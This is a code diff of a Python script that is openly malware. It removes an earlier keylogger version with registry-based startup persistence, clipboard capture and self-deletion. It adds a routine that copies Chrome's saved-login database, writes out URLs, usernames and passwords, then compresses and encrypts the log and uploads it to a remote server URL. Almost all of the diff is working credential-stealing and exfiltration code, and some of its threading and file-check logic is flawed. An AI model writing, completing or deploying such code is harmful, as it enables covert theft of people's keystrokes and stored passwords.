@@ -1,111 +1,140 @@
 import os
 import time
-from datetime import datetime
-from pynput import keyboard
-import threading
-import zipfile
+import sqlite3
+import shutil
+import requests
 import logging
+import threading
+import hashlib
+from datetime import datetime
+from cryptography.fernet import Fernet
+import configparser
+import zlib
+
+# Load configurations from an external config file
+config = configparser.ConfigParser()
+config.read(os.path.expanduser("~/.keylogger_config.ini"))
+
+SERVER_URL = config.get("Server", "URL", fallback="https://your-server-url.com/upload")
+encryption_key = config.get("Encryption", "Key", fallback=Fernet.generate_key().decode()).encode()
 
 # Log file details
 log_dir = os.path.expanduser("~/.keylogger_logs")
-log_file = os.path.join(log_dir, "keylog.txt")
-
-# Ensure log directory exists
 os.makedirs(log_dir, exist_ok=True)
+log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
 
-# Setup internal logging for debugging
+# Internal logging for debugging
 internal_log = os.path.join(log_dir, "internal_log.txt")
 logging.basicConfig(filename=internal_log, level=logging.DEBUG, format='%(asctime)s - %(message)s')
 
-# Hidden execution: Add to startup (Windows-specific)
-def add_to_startup():
-    try:
-        import winreg as reg
-        file_path = os.path.realpath(__file__)
-        key = reg.HKEY_CURRENT_USER
-        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
-        reg.SetValueEx(open_key, "KeyloggerApp", 0, reg.REG_SZ, file_path)
-        reg.CloseKey(open_key)
-    except Exception as e:
-        logging.error(f"Failed to add to startup: {e}")
+cipher_suite = Fernet(encryption_key)
 
-# Advanced Logging Features: Application tracking
-def log_active_window():
+# Function to retrieve Chrome passwords
+def get_chrome_passwords():
     try:
-        import win32gui
-        active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        chrome_data_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
+        temp_db = os.path.join(log_dir, "temp_db")
+
+        shutil.copy2(chrome_data_path, temp_db)
+
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        logins = cursor.fetchall()
+
         with open(log_file, "a") as file:
-            file.write(f"{datetime.now()} - Active Window: {active_window}\n")
-    except Exception as e:
-        logging.error(f"Failed to log active window: {e}")
+            for login in logins:
+                file.write(f"{datetime.now()} - URL: {login[0]}, Username: {login[1]}, Password: {login[2]}\n")
 
-# Advanced Logging Features: Clipboard logging
-def log_clipboard():
-    try:
-        import pyperclip
-        clipboard_data = pyperclip.paste()
-        with open(log_file, "a") as file:
-            file.write(f"{datetime.now()} - Clipboard: {clipboard_data}\n")
+        conn.close()
+        os.remove(temp_db)
     except Exception as e:
-        logging.error(f"Failed to log clipboard: {e}")
+        logging.error(f"Failed to retrieve Chrome passwords: {e}")
 
-# Self-destruction timer
-def self_destruct_timer(hours=24):
-    try:
-        time.sleep(hours * 3600)
-        os.remove(__file__)
-        os.remove(log_file)
-    except Exception as e:
-        logging.error(f"Self-destruction failed: {e}")
-
-# Compress logs to save space
+# Function to compress logs
 def compress_logs():
     try:
-        zip_file = os.path.join(log_dir, "logs.zip")
-        with zipfile.ZipFile(zip_file, "w") as zipf:
-            zipf.write(log_file, os.path.basename(log_file))
-        logging.info("Logs compressed successfully.")
+        with open(log_file, "rb") as file:
+            compressed_data = zlib.compress(file.read())
+        with open(log_file, "wb") as file:
+            file.write(compressed_data)
     except Exception as e:
         logging.error(f"Failed to compress logs: {e}")
 
-# Obfuscation: Placeholder for using pyarmor or external tools
-def obfuscate_script():
-    logging.info("Script obfuscation should be done externally before distribution.")
-
-# Handle key press
-def on_press(key):
+# Function to encrypt logs
+def encrypt_logs():
     try:
-        with open(log_file, "a") as file:
-            if hasattr(key, 'char') and key.char:
-                file.write(f"{datetime.now()} - {key.char}\n")
+        with open(log_file, "rb") as file:
+            encrypted_data = cipher_suite.encrypt(file.read())
+        with open(log_file, "wb") as file:
+            file.write(encrypted_data)
+    except Exception as e:
+        logging.error(f"Failed to encrypt logs: {e}")
+
+# Function to verify log file integrity
+def verify_log_integrity():
+    try:
+        with open(log_file, "rb") as file:
+            data = file.read()
+        checksum = hashlib.sha256(data).hexdigest()
+        logging.info(f"Log file checksum: {checksum}")
+        return checksum
+    except Exception as e:
+        logging.error(f"Failed to verify log integrity: {e}")
+        return None
+
+# Function to send logs to a server
+def send_logs_to_server():
+    retries = 3
+    for attempt in range(retries):
+        try:
+            with open(log_file, "rb") as file:
+                files = {"file": ("keylog.txt", file)}
+                response = requests.post(SERVER_URL, files=files)
+
+            if response.status_code == 200:
+                logging.info("Logs sent to server successfully.")
+                break
             else:
-                file.write(f"{datetime.now()} - [{key}]\n")
-    except Exception as e:
-        logging.error(f"Failed to log key press: {e}")
+                logging.warning(f"Failed to send logs: {response.status_code}, {response.text}")
+        except Exception as e:
+            logging.error(f"Error in sending logs to server: {e}")
+        time.sleep(5)
+    else:
+        logging.error("Failed to send logs after multiple attempts.")
 
-# Multi-language support: Basic compatibility by capturing all keys
-def multi_language_support():
-    # No additional implementation required; the current method supports multi-language input
-    logging.info("Multi-language support enabled.")
-
-# Listener and additional logging threads
-def start_keylogger():
+# Function to rotate internal logs
+def rotate_internal_logs():
     try:
-        # Start keylogger listener
-        with keyboard.Listener(on_press=on_press) as listener:
-            # Launch additional logging features in parallel
-            threading.Thread(target=log_clipboard, daemon=True).start()
-            threading.Thread(target=log_active_window, daemon=True).start()
-            threading.Thread(target=compress_logs, daemon=True).start()
-            threading.Thread(target=self_destruct_timer, args=(24,), daemon=True).start()
-            listener.join()
+        if os.path.exists(internal_log) and os.path.getsize(internal_log) > 1024 * 1024:  # 1MB
+            rotated_log = internal_log + ".1"
+            if os.path.exists(rotated_log):
+                os.remove(rotated_log)
+            os.rename(internal_log, rotated_log)
     except Exception as e:
-        logging.error(f"Keylogger failed to start: {e}")
+        logging.error(f"Failed to rotate internal logs: {e}")
+
+# Function to run the script in the background
+def run_in_background():
+    try:
+        if not os.path.isfile(log_file):
+            logging.error("Log file does not exist.")
+            return
+
+        rotate_internal_logs()
+
+        get_chrome_passwords()
+
+        compress_logs()
+        encrypt_logs()
+        verify_log_integrity()
+        send_logs_to_server()
+
+        os.remove(log_file)
+    except Exception as e:
+        logging.error(f"Background execution failed: {e}")
 
 # Entry point
 if __name__ == "__main__":
-    add_to_startup()
-    obfuscate_script()  # Run external obfuscation before distribution
-    multi_language_support()
-    start_keylogger()
+    threading.Thread(target=run_in_background, daemon=True).start()
